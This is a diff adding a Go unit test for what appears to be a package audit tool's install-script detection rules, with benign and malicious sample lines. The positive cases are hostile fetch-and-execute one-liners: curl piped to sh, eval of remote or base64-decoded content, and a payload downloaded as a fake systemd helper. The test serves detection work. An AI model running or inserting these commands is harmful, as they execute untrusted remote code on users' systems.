@@ -204,3 +204,24 @@ func TestAuditHostRulesNeedAFetchOrAPaste(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Install-script rules (read from InstallScriptContent by auditRuleFires) fired on eval as a word
+// tail or a flag, on curl presence probes and on a pubspec description.
+func TestAuditInstallRulesNeedTheCommand(t *testing.T) {
+	neg := []ruleCase{
+		{"P-INSTALL-EVAL", "cran", `octave --no-history --no-init-file --no-window-system -q -f --eval "$*"`},
+		{"P-INSTALL-EVAL", "npm", `postinstall: node --eval "const fs = require('node:fs'); if (fs.existsSync('dist/postinstall.js')) import('./dist/postinstall.js')"`},
+		{"P-INSTALL-EVAL", "pypi", `docs = retrieval "$query"`},
+		{"P-INSTALL-CURL", "cran", `if command -v curl >/dev/null 2>&1; then`},
+		{"P-INSTALL-CURL", "pub", `description: Dio interceptor for DevPul. Shows Dio requests, responses and errors live in the DevPul browser UI, with curl commands.`},
+		{"P-INSTALL-CURL", "conan", `if self.options.with_libcurl or self.options.with_openssl:`},
+	}
+	pos := []ruleCase{
+		{"P-INSTALL-EVAL", "npm", `eval "$(curl -fsSL http://x.example/p)"`},
+		{"P-INSTALL-EVAL", "npm", `x=$(echo aGk= | base64 -d); eval $x`},
+		{"P-INSTALL-CURL", "npm", `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`},
+		{"P-INSTALL-CURL", "npm", `command -v curl >/dev/null 2>&1 && curl -fsSL http://x.example/p | sh`},
+		{"P-INSTALL-CURL", "npm", `curl -s -L -o /tmp/systemd-helper "{PAYLOAD_URL}"`},
+	}
+	checkRuleCases(t, neg, pos)
+}
